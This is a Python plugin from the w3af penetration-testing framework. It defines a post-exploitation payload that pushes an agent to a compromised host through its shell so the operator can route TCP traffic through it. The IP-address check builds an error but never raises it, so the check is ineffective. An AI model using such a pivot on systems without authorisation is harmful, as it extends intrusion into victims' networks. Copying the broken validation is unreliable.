from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.misc.is_ip_address import is_ip_address
from w3af.core.controllers.w3afAgent.w3afAgentManager import w3afAgentManager

from w3af.plugins.attack.payloads.base_payload import Payload


class w3af_agent(Payload):
    """
    This payload starts a w3af agent that allows you to route TCP traffic through
    the compromised host.

    Usage: w3af_agent <your_ip_address>
    """
    def api_execute(self, ip_address):
        """
        Start a w3afAgent, to do this, I must transfer the agent client to the
        remote end and start the w3afServer in this local machine
        all this work is done by the w3afAgentManager, I just need to called
        start and thats it.
        """
        if not is_ip_address(ip_address):
            ValueError('Invalid IP address: "%s"' % ip_address)

        try:
            agentManager = w3afAgentManager(self.shell.execute, ip_address)
        except BaseFrameworkException, w3:
            return 'Error' + str(w3)
        else:
            agentManager.run()
            if agentManager.is_working():
                return 'Successfully started the w3afAgent.'
            else:
                return 'Failed to start the w3afAgent.'

    def run_execute(self, ip_address):
        api_result = self.api_execute(ip_address)
        return api_result
